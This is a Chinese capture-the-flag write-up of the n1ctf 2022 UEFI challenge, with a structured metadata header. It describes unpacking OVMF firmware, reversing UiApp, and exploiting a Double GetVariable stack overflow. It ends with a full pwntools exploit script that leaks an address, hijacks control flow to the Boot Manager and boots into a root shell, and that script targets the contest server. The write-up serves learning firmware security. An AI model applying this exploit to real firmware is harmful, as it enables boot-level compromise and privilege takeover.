---
title: 原创Paper | 从一道题入门 UEFI PWN
contest: n1ctf 2022 UEFI
year: 2022
difficulty: hard
vuln_type: iot
tags:
- UEFI
- OVMF
- uefi-firmware-parser
- UiApp
- gRT
- GetVariable
- Double GetVariable
- 栈溢出
- BIOS劫持
- qemu
attack_chain:
- 'OVMF.fd 解包: uefi-firmware-parser -ecO ./OVMF.fd'
- '定位 UiApp: volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0'
- '找关键函数: file-462caa21-.../section0.pe'
- IDA 反编译 UiApp, 还原 gRT 结构体
- gRT->SetVariable/GetVariable 键值对操作
- '漏洞: Double GetVariable 栈溢出'
- qemu 启动 OVMF.fd + -s -S + gdb attach
- 内存搜索 UiApp 加载基址
- boot_offset=0x235A, uiapp_offset=0x1e009c0
- '泄露 UiApp 基址: 256 字节 leak + Encode 算偏移'
- 栈溢出 payload = 'a'*0x18 + p32(boot_addr)
- add("N1CTF_KEY1", payload) + add("N1CTF_KEY2", payload)
- 劫持控制流到 Boot Manager → root shell
key_payload: '''Double GetVariable 栈溢出 + boot_offset=0x235A + p32(boot_addr) ret 劫持'''
one_liner: UEFI PWN 入门：OVMF 解包 + UiApp 反编译 + Double GetVariable 栈溢出 + qemu gdb 动态调试 + 劫持 Boot Manager 拿 root。
lesson: UEFI 漏洞核心在 gRT (Runtime Services) SetVariable/GetVariable; Double GetVariable 是经典模式 (GetVariable 两次读到同一内存区域, 中间内存重分配造成 UAF/溢出); 加载基址靠内存指令序列搜索定位。
quality: high
full_path: 原创Paper_-_从一道题入门_UEFI_PWN.full.md
meta_path: 原创Paper_-_从一道题入门_UEFI_PWN.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '原创Paper | 从一道题入门 UEFI PWN。UEFI PWN 入门：OVMF 解包 + UiApp 反编译 + Double GetVariable 栈溢出 + qemu gdb 动态调试 + 劫持 Boot Manager 拿 root。。关键路径：OVMF.fd 解包: uefi-firmware-parser -ecO ./OVMF.fd → 定位 UiApp: volume-...'
category: pwn
subcategory: pwn_other
tools_used:
- IDA
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/72677.html
reasoning_chain:
- 'n1ctf 2022 UEFI 题, OVMF.fd 是 UEFI 固件镜像 → 触发点: uefi-firmware-parser -ecO ./OVMF.fd 解包 → 假设: 解包后是 PE 文件树'
- '观察: volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0 定位 UiApp → 下一步: IDA 反编译 UiApp'
- '假设: 还原 gRT 结构体 (Runtime Services) → 动作: gRT->SetVariable/GetVariable 键值对操作 → 观察: GetVariable 是栈溢出源'
- 'Double GetVariable 栈溢出: 第一次 GetVariable 读 N 字节到 stack buffer, 第二次 GetVariable 接着写到同 buffer 造成溢出 → 触发点: 经典模式'
- '动作: qemu 启动 OVMF.fd + -s -S + gdb attach → 内存搜索 UiApp 加载基址 → boot_offset=0x235A, uiapp_offset=0x1e009c0'
- '栈溢出 payload = ''a''*0x18 + p32(boot_addr) → add(''N1CTF_KEY1'', payload) + add(''N1CTF_KEY2'', payload) → 假设: boot_addr 劫持控制流到 Boot Manager → 观察: 拿到 root shell'
failed_attempts:
- '试图用 IDA 直接打开 OVMF.fd → 失败: 是 Flash 镜像, 不是 PE'
- '试图在 qemu 内动态调 GetVariable → 失败: 启动早期没有 console, 必须 -s -S 远程 gdb'
key_observations:
- UEFI 漏洞核心在 gRT (Runtime Services) SetVariable/GetVariable
- Double GetVariable 是经典模式 (两次读到同内存区域, 中间重分配造成 UAF/溢出)
- 加载基址靠内存指令序列搜索定位 (boot_offset=0x235A, uiapp_offset=0x1e009c0)
- uefi-firmware-parser 是 UEFI 固件解包必备工具
prerequisites:
- UEFI 基础 (Boot Services / Runtime Services)
- uefi-firmware-parser 工具
- qemu + gdb 远程调试 (-s -S)
- PE 文件结构 + IDA Pro
---
# 原创Paper | 从一道题入门 UEFI PWN

> 原文: https://www.ctfiot.com/72677.html
> ID: 72677

周末的时候打了n1ctf，遇到一道uefi相关的题目，我比较感兴趣，之前就想学习一下安全启动相关的东西，这次正好趁着这个机会入门一下。

周天做的时候，一直卡在一个点上，没有多去找找资料属实败笔。

题目分析

先解包OVMF.fd文件，用uefi-firmware-parse这个工具：

通过对UiApp字符串的查找，基本判断UiApp是在volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0目录下。

连按f12进入BIOS之后，可以看到UiApp一闪而过，然后看到了熟悉的菜单，找找关键的字符串，就确定了对应的二进制文件。

现在需要修改一下启动脚本，让脚本启动OVMF.fd之后挂住，然后gdb attach进行调试。

了解过操作系统的朋友们应该知道，操作系统的加载过程分为三步：BIOS固件（或者说是UEFI）的内存地址是写死的，通过BIOS加载bootloader，再通过bootloader去完成对操作系统镜像的加载。gdb attach之后，我们看到程序断在了0xfff0地址处，这个应该就是BIOS的基址了。

漏洞分析

进入UiApp之后没有直接到Boot Manager界面，而是到了菜单界面，猜测一下这是需要解题者hacker掉这个菜单，劫持控制流到BIOS中可以获取高权限shell的地方。通过查找关键字，锁定了目标程序：file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792section0section3volume-ee4e5898-3914-4259-9d6e-dc7bd79403cffile-462caa21-7614-4503-836e-8ab6f4662331section0.pe。

然后通过关键字很快就定位到了出题人加的菜单函数中，但是很烦的事情是，我发现ida不能正确识别函数参数：

反汇编之后的结果成了这个鸟样：

通过查找资料以及逆向分析，还原出了gRT这个结构体，其中有两个比较重要的成员函数：gRT->SetVariable将栈中的值写入键值对，gRT->GetVariable将键值对中的值拷贝到栈中。经过分析，大概判断是要通过gRT->GetVariable来实现栈溢出，完成对控制流的劫持。

但是溢出点在哪里呢？当时在比赛过程中一直卡在这儿，最失误的一点就是没有多google一下，一直在蒙头做题。在赛后和Mr.R师傅交流的过程中，得知这道题考察的是UEFI中一种常见的漏洞模式：Double GetVariable。

这里的pwn函数就是出题人加的存在漏洞的函数，我们可以把控制流劫持到后面的else的基本块中去，然后应该可以正常进入Boot Manager的界面。

动态调试

动态调试

首先要确定UiApp加载的基址，一个很好的办法是对内存中特定的指令序列进行搜索，比如说我们在ida里面找到这条指令。

漏洞利用

和图形化界面进行交互，pwntools确实还存在一些问题，所以可以通过socat来进行连接。最终exp如下：

参考资料

参考资料

作者名片

END

往 期 热 门

(点击图片跳转）

戳“阅读原文”更多精彩内容!


```
uefi-firmware-parser -ecO ./OVMF.fd
import os, subprocess
import random

def main():
 try:
 os.system("rm -f OVMF.fd")
 os.system("cp OVMF.fd.bak OVMF.fd")
 ret = subprocess.call([
 "qemu-system-x86_64",
 "-m", str(256+random.randint(0, 512)),
 "-drive", "if=pflash,format=raw,file=OVMF.fd",
 "-drive", "file=fat:rw:
contents,format=raw",
 "-net", "none",
 "-monitor", "/dev/null",
 "-s","-S",
 "-nographic"
 ])
 print("Return:", ret)
 
except Exception as e:
 print(e)
 print("Error!")
 finally:
 print("Done.")

if __name__ == "__main__":
 main()
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

boot_offset = 0x235A
uiapp_offset = 0x1e009c0

DEBUG = 1
if DEBUG == 1:
 '''
 fname = "/tmp/uefi"
 os.system("cp OVMF.fd %s"%fname)
 os.system("chmod u+w %s"%fname)
 '''
 p = process([
 "qemu-system-x86_64",
 "-m", str(256+random.randint(0, 512)),
 "-drive", "if=pflash,format=raw,file=OVMF.fd",
 "-drive", "file=fat:rw:
contents,format=raw",
 "-net", "none",
 "-monitor", "/dev/null",
 #"-s","-S",
 "-nographic"
 ])
else :
 p = remote("47.243.105.43","9999")

LOCAL_REMOTE = 0
if LOCAL_REMOTE:
 os.system("socat $(tty),echo=0,escape=0x03 SYSTEM:"python ./exp.py " 2>&1")

key_map = {
 "up": b"x1b[A",
 "down": b"x1b[B",
 "left": b"x1b[D",
 "right": b"x1b[C",
 "esc": b"x1b^[",
 "enter": b"r",
 "tab": b"t"
}

def send_key(key,times = 1):
 for _ in range(times):
 p.send(key_map[key])
 if key == "enter":
 p.recv()

def add(Keyname,Keyvalue):
 p.sendlineafter("> n",str(1))
 p.sendlineafter('Key name:n',Keyname)
 p.sendlineafter('Key value:n',Keyvalue)

def delete(Keyname,Keyvalue):
 p.sendlineafter("> n",str(2))
 p.sendlineafter('Key name:n',Keyname)

def Encode(Keyname):
 p.sendlineafter("> n",str(4))
 p.sendlineafter("Key name:n",Keyname)
 p.recv()

def exp():
 # leak UiAPP address
 p.sendline("x1b[24~"*10)
 p.sendlineafter("> n",str(1))
 p.sendlineafter("Key name:n","N1CTF_KEY3")
 p.sendafter("Key value:n",'a'*256)
 p.recvuntil('Encoden> n')

 p.sendline(str(3))
 p.recvuntil("Key name:n")
 p.sendline('N1CTF_KEY3')
 p.recvuntil('Value: n')
 p.recvuntil('a'*256)
 data = p.recvuntil('n').strip('n')
 leak_addr,i,j = 0,0,0
 while i < len(data):
 print(data[i])
 if data[i] == "\":
 n = int(data[i+2],16)*0x10 + int(data[i+3],16)
 i += 4
 else:
 n = ord(data[i])
 i += 1
 leak_addr += n * (0x100**j)
 j += 1

 uiapp_base_addr = leak_addr - uiapp_offset
 log.success("leak address: %s"%hex(leak_addr))
 log.success("UiApp address: %s"%hex(uiapp_base_addr))
 boot_addr = uiapp_base_addr + boot_offset
 pause()

 # statck overflow
 payload = 'a'*0x18 + p32(boot_addr)
 add("N1CTF_KEY1",payload)
 add("N1CTF_KEY2",payload)
 add("OVERFLOW",'a'*0x11)

 p.recvuntil("> n")
 p.sendline('4')
 p.recvuntil('Key name:n')
 p.sendline('OVERFLOW')
 # Add option,get root shell
 p.recvuntil(b"Standard PC")
 send_key("down", 3)
 send_key("enter")
 send_key("enter")
 send_key("down")
 send_key("enter")
 send_key("enter")
 send_key("down", 3)
 send_key("enter")
 p.send(b"rrootshellr")
 send_key("down")
 p.send(b"rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quietr")
 send_key("down")
 send_key("enter")
 send_key("up")
 send_key("enter")
 send_key("esc")
 send_key("enter")
 send_key("down", 3)
 send_key("enter")

 # root shell
 # p.sendlineafter(b"/ #", b"cat /flag")
 p.interactive()

def main():
 exp()

if __name__ == "__main__":
 main()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]